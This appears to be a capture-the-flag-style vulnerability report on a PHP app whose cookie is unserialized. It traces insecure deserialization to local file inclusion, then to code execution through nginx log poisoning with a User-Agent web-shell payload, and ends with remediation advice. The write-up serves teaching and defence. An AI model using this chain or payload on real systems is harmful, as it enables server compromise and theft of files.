# Vulnerability Report

## Context

The vulnerable program is a PHP web application composed of:

- Backend logic in `index.php` and `PageModel.php`
- A static frontend in `index.html`

The vulnerability exists entirely in the backend logic and is triggered through cookie handling.

The application implements a custom session mechanism using a cookie named `PHPSESSID`. Instead of storing session state on the server, it serializes a PHP object, encodes it with Base64, and stores it directly in the client cookie.

### Application Flow

1. If no `PHPSESSID` cookie is present:
   - A `PageModel` object is created
   - `$file` is set to `/www/index.html`
   - The object is serialized and Base64-encoded
   - The encoded value is stored in the cookie

2. On every request:
   - The cookie is Base64-decoded
   - The result is passed directly into `unserialize()`

### Relevant Backend Code

```php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

### PageModel Class

```php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
```

### Execution Environment

- PHP running in a Linux environment
- Nginx web server (inferred from log path `/var/log/nginx/access.log`)
- Container startup script renames a sensitive file:

```bash
mv /flag /flag_<random_suffix>
```

### Input Surface

The attack surface consists of:

- `PHPSESSID` cookie (fully attacker-controlled)
- HTTP headers (used during exploitation for log poisoning)

---

## Vulnerability

### Classification

- **CWE-502**: Deserialization of Untrusted Data
- **CWE-98**: Improper Control of Filename for Include/Require Statement

### Root Cause

The application performs unsafe deserialization of untrusted input:

```php
$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

There is no validation, authentication, or restriction on the serialized object. This allows an attacker to construct arbitrary PHP objects and control their internal state.

### Dangerous Sink

The `PageModel` class defines a destructor that includes a file:

```php
public function __destruct() 
{
    include($this->file);
}
```

Because `$file` is a public property, it can be controlled by the attacker through deserialization.

### Vulnerability Mechanics

1. Attacker supplies a malicious serialized object via the cookie
2. The application unserializes the object
3. The object's properties are populated with attacker-controlled values
4. At the end of execution, PHP invokes `__destruct()`
5. The application executes:

```php
include($this->file);
```

This results in a **Local File Inclusion (LFI)** vulnerability.

### Trigger Condition

The vulnerability is triggered when the attacker sends a request containing:

- A `PHPSESSID` cookie
- The cookie contains a Base64-encoded serialized `PageModel` object
- The `$file` property is set to an arbitrary file path

---

## Exploitation

### Overview

The vulnerability enables a multi-stage exploit chain:

1. Insecure deserialization → Local File Inclusion (LFI)
2. LFI → Remote Code Execution (RCE) via log poisoning

### Stage 1: Local File Inclusion

The attacker crafts a serialized object:

```php
class PageModel {
    public $file = "/etc/passwd";
}
```

The object is serialized, Base64-encoded, and placed into the `PHPSESSID` cookie. When processed:

```php
include("/etc/passwd");
```

This results in disclosure of arbitrary files on the server.

### Stage 2: Log Poisoning

To escalate to code execution:

1. Send a request with a malicious `User-Agent` header:

```
<?php system($_GET['cmd']); ?>
```

This payload is written to:

```
/var/log/nginx/access.log
```

2. Modify the serialized object:

```php
class PageModel {
    public $file = "/var/log/nginx/access.log";
}
```

3. When included:

```php
include("/var/log/nginx/access.log");
```

The injected PHP code executes.

### Stage 3: Command Execution

The attacker can now execute commands via:

```
/?cmd=ls
/?cmd=cat /flag_<random>
```

Because the flag filename is randomized at runtime, the attacker must first enumerate files before reading it.

### Exploit Primitives

This vulnerability chain provides:

- Arbitrary object injection
- Arbitrary file inclusion
- Arbitrary file read
- Arbitrary command execution

---

## Remediation

### 1. Eliminate Unsafe Deserialization

**Replace:**

```php
unserialize($cookie);
```

**With:**

```php
json_decode($cookie, true);
```

Or restrict classes:

```php
unserialize($cookie, ['allowed_classes' => false]);
```

### 2. Remove Dangerous Destructor Behavior

Avoid performing sensitive actions in `__destruct()`:

```php
public function __destruct() 
{
    include($this->file);
}
```

Use explicit, controlled function calls instead.

### 3. Validate File Paths

If file inclusion is required:

- Use an allowlist of permitted files
- Use `realpath()` to resolve paths
- Restrict access to a specific directory

### 4. Protect Cookies

- Sign cookies using HMAC
- Reject modified or tampered cookies

### 5. Harden Logging

- Store logs outside executable contexts
- Prevent logs from being interpreted as PHP code

### 6. Variant Analysis

To identify similar vulnerabilities:

- Search for `unserialize()` applied to user input
- Identify magic methods (`__destruct`, `__wakeup`)
- Trace data flow to dangerous sinks (`include`, `system`)
- Use static analysis tools (e.g., PHPStan, Psalm)
- Perform fuzzing with serialized payloads

---

## Summary

The vulnerability is caused by unsafe deserialization of attacker-controlled input combined with a destructor that performs file inclusion. This enables an attacker to escalate from Local File Inclusion to Remote Code Execution via log poisoning, resulting in full compromise of the application.
